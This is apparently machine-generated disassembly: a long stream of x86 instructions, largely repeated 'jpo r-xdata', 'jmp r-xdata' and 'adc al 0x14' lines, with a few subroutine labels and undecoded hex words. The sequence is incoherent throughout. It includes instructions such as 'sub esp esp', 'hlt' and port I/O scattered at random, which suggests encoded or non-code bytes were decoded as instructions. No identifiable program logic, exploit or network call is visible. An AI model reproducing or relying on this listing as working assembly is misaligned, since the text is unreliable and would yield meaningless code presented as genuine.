adc al 0x7c
jae r-xdata
adc al 0x14
mov ebx 0x135f6e66
adc al 0x14
mov ebx 0x66c3bd14
adc al 0xb8
outsb
and edx [ esi ]
outsb
add bl dl
push ecx
adc al 0x14
mov edx 0x14312a02
adc al 0x7b
jpo r-xdata
jmp r-xdata
add ch [ edx ]
xor [ esp + edx ] edx
jpo r-xdata
xchg ecx eax
jpo r-xdata
jpo r-xdata
outsb
fsubr [ ebx ]
jpo r-xdata
pushad
lodsb [ esi ]
xor [ esp + edx ] edx
jpo r-xdata
mov ebx 0x23bae66
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
sub ecx ebp
add ah [ esi + edx * 2 ]
and eax 0x66661414
pop ebx
jmp r-xdata
loope r-xdata
jpo r-xdata
out dx eax
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
outsb
sub esp esp
outsb
and bh ch
jmp r-xdata
jmp r-xdata
add dh [ edx + 0x21 ]
adc al 0x14
jpo r-xdata
cdq
lea esp [ edx - 0x52 ]
add [ edx + 0x19ae628d ] 0xae628db3
pop ds
or [ esi + 0x14350c02 ] 0xb07b7b14
sub [ ebx + 0x7b ] bh
jmp r-xdata
adc al 0x14
add bh ah
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
call 0x146f37bb
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0xbb
cmpsd [ esi ] [ edi ]
outsb
sub esp esp
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
add edx [ esp + edx ]
add dl cl
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
mov ebx 0xd88fbd14
and ch [ eax + 0x13 ]
adc al 0xe4
jle r-xdata
push ss
outsb
scasb [ edi ]
adc al 0x7b
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
0x6e66ebeb 0x165b
sahf
out dx al
jmp r-xdata
in al 0x6e
outsb
outsb
cmp ecx [ ebp - 0x4ef0419e ]
or ebx 0x14555602
adc al 0xb8
mov eax 0x11576e66
adc al 0x14
punpckldq mm6 [ esi - 0xc43ebc9 ]
mov esp 0x14089902
adc al 0x7b
jpo r-xdata
outsd
xchg edi eax
mov ebx 0xe42b6ea7
pop ds
xchg si ax
jpo r-xdata
or [ esi + 0x21720287 ] 0x14
adc al 0x7b
jpo r-xdata
mov eax 0x142e6002
adc al 0x7b
mov ebx 0x9807ae2c
clc
jpo r-xdata
adc al 0x14
add bh al
sbb dl [ esp + edx ]
jpo r-xdata
outsb
mov bh 0x16
adc al 0x14
jpo r-xdata
lodsd [ esi ]

xchg esi eax
jpo r-xdata
in al 0x7e
sub ah [ eax + 0x12 ]
add ch [ ebx + 0x7b141455 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
fsubr [ ebx ]
lea esp [ edx - 0x42 ]
and eax 0x3dae628d
lea esp [ edx - 0x5a ]
pop ds
mov bl 0x8d
jpo r-xdata
adc al 0x7b
jpo r-xdata
sub ebp [ ebx + 0x1413f802 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
add ebx eax
jpo r-xdata
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x4c717ec7 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jpo r-xdata
add bh al
add esi esi
jmp 0x6702f456
mov dl 0x8d
fsub st1
jmp r-xdata
jpo r-xdata
outsd
or [ esi + 0x14 ] bl
jpo r-xdata
sbb edx [ esp + edx ]
outsb
push edi
adc [ esp + edx ] edx
add dh [ eax + 0x38 ]
adc al 0x14
jpo r-xdata
loope r-xdata
push 0x2b6ee72f
add ch [ ecx + 0x17 ]
pop ss
fsubr [ ebx ]
lea esp [ edx - 0x52 ]
lds ecx [ ebp - 0x4cee519e ]
lea esp [ edx - 0x52 ]
jpo r-xdata
push 0xeaffcf97
in al 0x6e
arpl [ ebp + 0x14 ] dx
adc al 0x60
test al 0xfb
outsb
sub eax [ edx ]
clc
daa
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esp [ esi + 0x60898111 ]
jmp r-xdata
push ss
adc al 0x14
adc al 0x14
pop bx
das
out 0x6e eax
sub eax [ edx ]
imul edx [ edi ] 0x7b7b1414
mov ebx 0xf5a85de4
test al 0xd3
pop esi
adc al 0x14
in al 0x5d
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp esp esp
outsd
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
iretd
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc [ ecx - 0x72dc9f77 ] eax
bound esp [ esi - 0x72dd27e9 ]
bound esp [ esi - 0x1387fdeb ]
adc al 0xe4
jpo r-xdata
scasd [ edi ]
iretd
jpo r-xdata
mov ebx 0x60b39814
sub eax 0x14284402
adc al 0xe4
outsd
out dx eax
jmp r-xdata
test al 0xf5
sub eax 0x3eb14ae
imul cl
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
pop es
pop esi
cmp edx [ esi ]
adc al 0x14
adc al 0xbc
sti
add dl [ ecx ]
push cs
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
xor ebp [ esi ]
adc al 0x14
add al [ ecx + 0x7b14142a ]
jpo r-xdata
sub esp esp
outsd
push 0x3d02c614
add [ esp + edx ] edx
0x55636ee4 0x1414
jpo r-xdata
jpo r-xdata
pop ebp
jpo r-xdata
adc al 0xaf
iretd
jpo r-xdata
adc al 0xeb
pop ebx
fstp [ eax + 0x3a03ed62 ]
adc al 0x9e
jmp r-xdata
in al 0x5c
test al 0xf7
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
pop es
pushad
scasb [ edi ]
pop ds
mov [ ebp - 0x4cf6519e ] ecx
or [ edx + 0xfae628d ] 0x14573b02
adc al 0x60
xor cl [ ebp + 0x60a5b662 ]
pop ebp
xchg esi eax
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
out 0x62 eax
0x3e7302b8 0x1414
bound edx [ esi + 0x14b8bb17 ]
mov ebp 0x17ae60af
bound ebp [ edi + 0x28d0f7cf ]
add ch [ esi ]
or edx [ esp + edx ]
jpo r-xdata
and ecx [ ebp - 0x27e8599e ]
and cl [ ebp + 0x215a662 ]
js r-xdata
pushad
scasb [ edi ]
cvtpi2ps xmm2 [ ebx ]
hlt
sar [ ebx - 0xa57a21c ] cl
jpo r-xdata
iretd
add bh [ 0x14141401 ]
lahf
adc al 0x6d
push edi
jmp r-xdata
adc dx [ esi ]
adc al 0x14
add esp [ ebp + 0x1b ]
adc al 0x14
dec edi
adc eax 0x2bd1414
salc
sbb [ esp + edx ] dl
mov ebx 0xebeea803
jmp r-xdata
lea ebp [ esi + 0x39 ]
in al 0x6f
xor al 0x8d
bound esi [ esi + 0xc0f02bb ]
adc al 0x14
lea esp [ edx - 0x52 ]
or eax 0x14037c02
adc al 0x7b
jpo r-xdata
pushad
jpo r-xdata
mov ebp 0xef8503bb
jmp r-xdata
daa
adc al 0x14
add [ eax - 0x4724a443 ] 0x62
insd
pop es
sbb [ edx - 0x4724a443 ] 0x62
in eax dx
and [ esi - 0x699d724c ] 0x3c3a0253
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x5d
lea esp [ edx - 0x4a ]
mov ebx 0x140c0f02
adc al 0x8d
bound ebp [ esi + 0x37c020d ]
adc al 0x14
jpo r-xdata
adc esp [ edx - 0x52 ]
cmp esp [ esi - 0x52 ]
cmp edi [ ebx + 0x1405dd02 ]
adc al 0x7b
pushad
lodsd [ esi ]
fist [ esi + ebx * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x8d
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop ebx
jpo r-xdata
lea esp [ edx - 0x42 ]
stosd [ edi ]
pushad
xor ebx eax
jpo r-xdata
bound edx [ esi + 0x3c3a0253 ]
bound ebp [ esi - 0x27d427e5 ]
cmp [ edx - 0x52 ] esp
pop ss
add dl [ eax + 0x7b141405 ]
jpo r-xdata
pushad
scasb [ edi ]
pop ss
bound ebp [ esi + 0x13ae6003 ]
bound ebp [ esi + 0x1fae6007 ]
in al 0x6e
dec edi
pop ds
adc al 0x14
mov ch 0x28
jpo r-xdata
jge r-xdata
add edi [ edx ]
0xb8db5bbd 0xed62
xor dh [ ecx + 0xdb6628d ]
lea esp [ edx - 0x6a ]
sbb eax 0x1401d202
adc al 0x7b
jpo r-xdata
cmp [ ecx - 0x499d7264 ] eax
jge 0x60f0c93d
mov esi 0xd83360ab
add edx [ ecx - 0x7e141411 ]
sti
scasb [ edi ]
adc al 0x9f
jpo r-xdata
adc al 0x14
mov ebx 0x145f7602
adc al 0x8d
jmp r-xdata
fsubr [ ebx ]
add al dh
adc al 0x14
jpo r-xdata
bound esp [ esi + 0x311d02cf ]
adc al 0x14
jpo r-xdata
jpo r-xdata
sahf
adc al 0x14
jpo r-xdata
jg r-xdata
jpo r-xdata
adc al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
lahf
pushad
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
scasd [ edi ]
iretd
lea esp [ edx - 0x51 ]
jpo r-xdata
add [ ebx + esi * 4 + 0x628d9b81 ] 0xb3d7cfaf
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
scasd [ edi ]
iretd
jpo r-xdata
or [ esi - 0x30509d73 ] 0x8581b3d5
jpo r-xdata
jpo r-xdata
bound edx [ edi + 0x3bdffcf ]
or bl ch
jmp r-xdata
lea esp [ edx - 0x5a ]
iretd
scasd [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
0x14f3cfaf 0xcfaf
lea esp [ edx - 0x51 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
fwait
lea esp [ edx - 0x51 ]
jpo r-xdata
0xcfaf628d 0xd8a9
bound ebp [ edi - 0x7e4c5431 ]
jpo r-xdata
jpo r-xdata
iretd
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ecx
call 0x2faff711
out 0x66 eax
scasb [ edi ]
aas
mov ebx 0x14237002
adc al 0x7b
jpo r-xdata
bound ebp [ esi - 0x347e4cfb ]
bound ebp [ edi - 0x7e4c2831 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aad 0xb3
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
mov esp 0x9662b8bc
pop ss
adc al 0xbd
jmp r-xdata
iretd
jpo r-xdata
mov bl 0x81
jecxz r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
add [ ebp - 0x30509d73 ] 0xea81b3ab
lea esp [ edx - 0x51 ]
iretd
jpo r-xdata
add eax 0x8dcb81b3
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
int1
jmp r-xdata
push ebp
aaa
adc al 0x14
mov dl 0x6e
add bl [ ecx + 0x7b14141d ]
push 0x7
or ebx 0x1bae628d
mov bl 0x81
into
mov bl 0x81
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ edx + eax + 0x141439fe ] edi
jpo r-xdata
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb esi [ ebx - 0x66fd317f ]
sbb eax 0x6a7b1414
pop es
jpo r-xdata
bound ebp [ edi - 0x7e4c2a31 ]
jpo r-xdata

jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4ce5 ]
add eax [ ecx - 0x18 ]
jmp r-xdata
test [ ebp - 0x5430509e ] ecx
mov bl 0x81
jpo r-xdata
sub_46fe0e
push 0xfb81e72f
scasb [ edi ]
aaa
mov eax 0xfb5a03bb
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi ebx
jmp r-xdata
lea esp [ edx - 0x4a ]
or esi [ eax + 0x628ddd81 ]
xchg esi eax
add esi [ ecx + eax * 4 - 0x419d7221 ]
cmp bh bl
add bl [ edi ]
adc al 0x14
jpo r-xdata
pushad
xor cl [ ebp + 0x249b662 ]
or al 0x1f
adc al 0x14
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x52 ]
adc esp [ esi - 0x52 ]
outsd
mov ebp 0xfb3a03bb

sub_47006d
mov esp 0x14569302
adc al 0x7b
jpo r-xdata
lodsb [ esi ]
add cl [ ebp + 0x7b14140a ]
outsb
jpo r-xdata
mov cl 0x81
fiadd [ edx ]
movsd [ edi ] [ esi ]
xor [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
dec edi
add ebx [ ecx - 0x19 ]
jmp r-xdata
lea ecx [ edx ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0xe4
outsd
inc [ ebx ]
adc al 0x14
add ah al
cmp [ esp + edx ] edx
pushad
cmp cl [ ebp - 0x4ece419e ]
sbb edx 0x1431a502
adc al 0x7b
adc al 0x14
jpo r-xdata
in al 0x6f
cmc
cmp dl [ esp + edx ]
and dx [ esi ]
adc al 0x14
add ah ch
cmp dl [ esp + edx ]
jpo r-xdata
mov ebp 0xa8031360
jpo r-xdata
and eax 0xebe67702
jmp r-xdata
scasb [ edi ]
jpo r-xdata
adc edi [ ebx + 0x50022d60 ]
aaa
adc al 0x14
jpo r-xdata
scasb [ edi ]
pushad
scasb [ edi ]
pop ss
pushad
[ ebp + 0x2 ]
movsd [ edi ] [ esi ]
in al 0x6e
insd
and dl [ esp + edx ]
mov ah 0xb5
sub [ ebx + 0x7b ] bh
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x14
adc eax [ ebx ]
jpo r-xdata
jmp r-xdata
sbb eax 0xae661414
jpo r-xdata
test al 0x3f
test eax 0x31360bd
jpo r-xdata
pop es
jpo r-xdata
mov ebx 0xebe7f903
jmp r-xdata
adc al 0x9e
pop ds
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
sti
adc al 0x66
jpo r-xdata
pushad
jpo r-xdata
jg r-xdata
jpo r-xdata
jpo r-xdata
xchg esi eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
sub esp [ edx ]
adc al 0x14
add dh [ eax - 0x1e ]
jmp r-xdata
xor [ esp + edx ] edx
lodsd [ esi ]
mov eax [ ebx ]
fstp [ edi ]
adc al 0x14
adc [ edi - 0x437e7346 ] 0x62
jpo r-xdata
jpo r-xdata
add bl [ esi + 0x14ebebeb ]
sahf
pop ss
outsb
sbb eax 0x31186fe4
scasb [ edi ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
add ebp [ eax + 0x214143f ]
jpo r-xdata
adc [ ebx - 0x72537e4f ] 0xb171be62
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0x13683c14
0x26f06ee4 0x1414
jmp r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
add ch [ esi + 0x7b14142e ]
jpo r-xdata
adc al 0xbc
lahf
add bh cl
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
bound edx [ esi + 0x31040205 ]
add cl [ ebx ]
sub al 0x14
add esp [ eax ]
adc al 0x14
jpo r-xdata
mov ebx 0xe9ebed83
jpo r-xdata
aas
jpo r-xdata
or esi [ ebx - 0x141362fe ]
jmp r-xdata
jpo r-xdata
sub ebp 0xffffffeb
jpo r-xdata
adc al 0x14
loopne r-xdata
xor al 0x38
adc [ eax + 0x2d ] ch
jecxz r-xdata
pushad
stosd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax 0xbe7b1414
pushad
pop es
push 0x7
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
push 0x6d62f32f
pop ds
jpo r-xdata
in eax dx
jpo r-xdata
or ebp [ esp + edx ]
adc al 0x2
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x60ebebec ]
scasd [ edi ]
iretd
jpo r-xdata
jmp r-xdata
jpo r-xdata
sahf
pop ss
fsub [ edx ]
add dh ah
pop es
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
arpl [ edi + 0x15684cfe ] si

mov ebp 0xe42b6ea7
jpo r-xdata
adc al 0x7b
lds edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ edx ]
xchg edi eax
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x63 eax
jmp r-xdata
adc al 0x68
or edi [ ecx ]
bound ebp [ ebp + 0x1f ]
jpo r-xdata
jpo r-xdata
jmp 0xffffffffe84c04fa
jpo r-xdata
and [ 0xffffffffae661414 ] bl
jpo r-xdata
sub eax [ edx ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
mov esp 0x135f6e66
jmp r-xdata
outsd
outsb
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
shr [ eax ] 0x1
jpo r-xdata
mov eax 0x142efc02
jpo r-xdata
outsd
push 0x2141422
jpo r-xdata
adc al 0x14
jpo r-xdata
loop r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
mov edi 0xb8ebebe2
mov ebp 0x541b60bc
out dx eax
0x66bcebeb 0x5f6e
inc esp
add eax 0x7b7b1414
adc al 0x14
push edi
xor [ eax + 0x56 ] al
add al [ 0x7bebebe8 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
fucomi st6
jpo r-xdata
jpo r-xdata
add eax 0x7bebebe8
jpo r-xdata
outsd
out dx al
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
nop
in al 0x6f
jpo r-xdata
adc al 0x14
push cs
mov dh 0x28
jpo r-xdata
mov al 0x60
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
cld
jpo r-xdata
pushad
adc al 0x14
mov ch 0x2
mov eax 0x7bebebeb
jpo r-xdata
jpo r-xdata
mov esi 0x142dc902
adc al 0x7b
mov esi 0x76a0760
jmp r-xdata
popad
cmpsb [ esi ] [ edi ]
jmp r-xdata
cmc
jpo r-xdata
mov [ ecx - 0x70529d44 ] es
add dl dl
adc al 0x14
jpo r-xdata
call 0x7bc2edfe
lodsd [ esi ]
pop [ edx ]
xchg edi eax
bound edi [ esi - 0x699d728d ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
in al 0x6e
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
push 0x2402e929
push esi
jpo r-xdata
sub esp [ esi - 0x4f ]
cmp ebp [ eax + 0x10 ]
jpo r-xdata
mov ss [ ebx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
add ecx [ ebx ]
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
add al [ ebx + ecx ]
sar [ esi ] cl
mov esp 0x28fad62
jpo r-xdata
cmp [ edx - 0x2dfd7053 ] 0x7b14143e
lea esp [ edx - 0x6a ]
add eax 0x14310402
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] edx
jpo r-xdata
bound ebp [ esi - 0x62fd4cf5 ]
lea esp [ edx - 0x42 ]
ja r-xdata
mov dh 0x11
outsb
jpo r-xdata
lea esp [ edx - 0x42 ]
jae r-xdata
mov ss [ edx ]
jpo r-xdata
add bh bl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
adc al 0x14
add edi edi
loope r-xdata
or [ ebp - 0x4ce6519e ] 0x8d
bound ebp [ esi + 0x28e811f ]
or al 0x35
adc al 0x14
jpo r-xdata
adc al 0x14
rol [ ebx ] 0x1
jpo r-xdata
mov cl 0x3b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub ah ah
jpo r-xdata
jpo r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
pushad
adc eax [ ecx + 0x7d14bc8f ]
jpo r-xdata
sub dl [ ds : esp + edx ]
add ch [ eax + 0x5 ]
adc al 0x14
jpo r-xdata
sub esp esp
jpo r-xdata
bound edi [ esi - 0x617e4e8f ]
bound ebp [ esi - 0x7d7e4ce7 ]
add bh [ ecx + eax + 0x7b7b1414 ]
jpo r-xdata
jpo r-xdata
adc al 0x14
bound ebp [ ebp + 0x3ed2028f ]
lea esp [ edx - 0x52 ]
sbb [ ebx - 0x43fd7d7f ] esi
add [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jecxz r-xdata
mov edx 0x62bc818c
jpo r-xdata
cmp al 0x68
adc ebp edx
in al 0x6e
bound edx [ esi - 0x6c7e4b81 ]
mov cl 0x81
lodsb [ esi ]
lea esp [ edx - 0x42 ]
jno r-xdata
mov ss [ esp + edx + 0x14 ]
add bh [ edx - 0x1e ]
jmp r-xdata
add ecx [ esi + 0x68141412 ]
das
out 0x6e eax
sub esp esp
outsd
adc al 0x14
push 0x2b6ee72f
in al 0x6f
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
outsd
rcr bh cl
cli
in al 0x6e
in eax 0xeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x14b830d8
outsb
pop edi
adc edx [ esp + edx ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + esi * 8 - 0x1494147d ]
mov al 0x28
jpo r-xdata
jpo r-xdata
jmp r-xdata
lahf
adc [ esp + edx ] dl
mov al 0x28
jpo r-xdata

add ebp [ esi + ebp ]
adc al 0x14
fcomp [ 0xffffffffb6022b6e ]
aaa
adc al 0x14
jpo r-xdata
push 0xd102e210
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
or [ edi + 0x5b7d14bc ] 0xb8ebebeb
add al [ eax + 0x1b ]
adc al 0x14
jpo r-xdata
outsd
in al 0x6e
inc esp
out 0xeb eax
jmp r-xdata
adc al 0x14
jpo r-xdata
arpl bx sp
jpo r-xdata
jpo r-xdata
add al 0x31
jpo r-xdata
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
jpo r-xdata
out dx eax
jmp r-xdata
aas
adc al 0x14
jpo r-xdata
sbb [ esi + 0x77be628d ] 0x1437e302
adc al 0x7b
jpo r-xdata
jpo r-xdata
bound edi [ esi - 0x72c59fcd ]
bound edi [ esi - 0x257e4ecf ]
add ah [ ebp + 0x7b141431 ]
bound esp [ esi - 0x519d72b3 ]
mov dl 0x1c
jpo r-xdata
mov [ ebx + 0x628d8f81 ] esi
scasb [ edi ]
add esi [ ebx + 0x628d8a81 ]
scasb [ edi ]
add [ ebx + 0x628d8c81 ] esi
scasb [ edi ]
pop es
mov bl 0x2
shl [ ebx ] 0x14
adc al 0x7b
jpo r-xdata
outsb
and edx [ esi ]
adc al 0x14
mov ebx 0x6083bd14
scasb [ edi ]
out 0xd0 eax
sub [ edx ] al
cdq
jmp r-xdata
sbb [ esp + edx ] edx
cmp [ ecx + 0x628db38e ] eax
scasb [ edi ]
imul edx [ esi + 0x6ee4eafb ] 0x5d
add dl [ esp + edx ]
mov eax 0x16236e66
adc al 0x14
jpo r-xdata
lodsd [ esi ]
jpo r-xdata
jpo r-xdata
and [ esi ] 0xfffffffa
jmp 0x5049c23d
bound ebp [ ebp + 0x3afe03f7 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
and edx [ esi ]
jpo r-xdata
loop r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dh [ edx ]
sub [ esp + edx ] dl
jpo r-xdata
mov ebx 0xeb037c14
jpo r-xdata
scasb [ edi ]
cmp eax [ edx ]
call 0x7bc2f173
adc al 0xbd
out dx eax
mov esp 0x32d60bb
mov ah 0x37
adc al 0x14
push 0xee02fb2f
loop r-xdata
jpo r-xdata
cmp eax 0x14149c02
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
mov esp 0xeb5b7d14
jmp r-xdata
jpo r-xdata
scasb [ edi ]
cmp esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0xb8
mov ebx 0xebebd502
jmp r-xdata
jpo r-xdata
out 0xeb eax
add esi ebp
adc al 0x7b
jpo r-xdata
in al dx
jmp r-xdata
mov bl 0x2
jpo r-xdata
inc ebp
pushad
cmpsb [ esi ] [ edi ]
dec ebp
lea esp [ edx - 0x52 ]
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
adc al 0xd8
xor [ edx ] al
push 0x34
adc al 0x14
mov esp 0x14267902
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc edx [ esp + edi * 4 ]
mov edi 0x6fe42b6e
or ebx [ esi ]
adc al 0x14
mov eax 0xae66ef81
aaa
mov ebx 0x6013ae60
imul ecx [ edi - 0x15 ] 0xffffffeb
jmp r-xdata
jpo r-xdata
pushad
adc al [ edx ]
stosd [ edi ]
push ebp
adc al 0x14
jpo r-xdata
jmp r-xdata
adc al 0xbb
adc al 0x7c
add ebp ebx
sub al 0xae
pop es
cwde
add edi esi
cmp dl [ esp + edx ]
adc [ edx + 0x14126b02 ] 0x817b7b14
adc al 0x14
jpo r-xdata
xchg esi eax
sti
0x25d6ee4 0x1414
test [ ebx ] 0x14143afe
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jl r-xdata
mov esp 0x206ae62
lds eax [ eax ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x16b76e66
jpo r-xdata
adc al 0x14
pushad
movsd [ edi ] [ esi ]
retn
pop ebx
adc al 0x7d
jpo r-xdata
jpo r-xdata
and esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0x2
adc edx [ esp + edx ]
adc al 0x60
jpo r-xdata
adc al 0x14
jpo r-xdata
sub eax [ edx ]
add al 0xb
bound ebp [ ebp + 0x1f ]
mov esp 0xeb2f5562
jmp r-xdata
adc [ edi + 0x30 ] 0x40
push esi
add ch dh
jge r-xdata
mov dl 0xd8
out dx al
jmp r-xdata
pop ss
jpo r-xdata
jpo r-xdata
jpo r-xdata
popfd
fsubr [ ebx ]
add ch [ ecx + eax + 0x7b7b1414 ]
scasb [ edi ]
or ebx 0x33be628d
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop ss
mov ebx 0xafbd14b8
pushad
scasb [ edi ]
pop ss
add edx [ ecx + 0x66ebebe1 ]
jpo r-xdata
adc eax 0xebeaef83
jmp r-xdata
jpo r-xdata
or [ esi - 0x72787e4d ] 0xb31dae62
or [ ebp + 0x13ae628d ] 0x8dc581b3
bound ebp [ esi + 0x628db311 ]
scasb [ edi ]
cmp esi [ ebx + 0x39ae628d ]
or [ esi - 0x519d724d ] 0x8d2bd83f
bound edi [ esi - 0x519d72db ]
cmp eax 0x1fa6628d
jpo r-xdata
xchg esi eax
xor esp [ esi + 0x66 ]
pop ebx
push ss
adc al 0x14
add esi esi
loope r-xdata
jpo r-xdata
xchg edx eax
add ch [ ebx + 0x12 ]
adc al 0x14
jpo r-xdata
inc ebx
jmp r-xdata
jl r-xdata
mov ebx 0x2efc02b8
jpo r-xdata
push ss
adc al 0x7c
jae r-xdata
adc al 0x14
mov ebx 0x135f6e66
adc al 0x14
mov ebx 0x66c3bd14
adc al 0xb8
outsb
and edx [ esi ]
outsb
add bl dl
push ecx
adc al 0x14
mov edx 0x14312a02
adc al 0x7b
jpo r-xdata
jmp r-xdata
add ch [ edx ]
xor [ esp + edx ] edx
jpo r-xdata
xchg ecx eax
jpo r-xdata
jpo r-xdata
outsb
fsubr [ ebx ]
jpo r-xdata
pushad
lodsb [ esi ]
xor [ esp + edx ] edx
jpo r-xdata
mov ebx 0x23bae66
jmp r-xdata
jpo r-xdata
add al ch
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7d
inc edi
jmp r-xdata
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x6a ]
sub [ eax + 0x15 ] esp
lea esp [ edx - 0x6a ]
das
cmp [ ebp + 0x14379802 ] 0x760be14
push 0x8981db07
mov bl 0x81
mov eax [ 0x2141407 ]
pop edi
cmp [ esp + edx ] dl
pushad
pop es
mov edx 0x14d8bcba
mov esp 0x1439d202
adc al 0x7b
in al 0x6f
and eax 0x66661414
pop ebx
jmp r-xdata
loope r-xdata
jpo r-xdata
out dx eax
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
outsb
sub esp esp
outsb
and bh ch
jmp r-xdata
jmp r-xdata
add dh [ edx + 0x21 ]
adc al 0x14
jpo r-xdata
cdq
lea esp [ edx - 0x52 ]
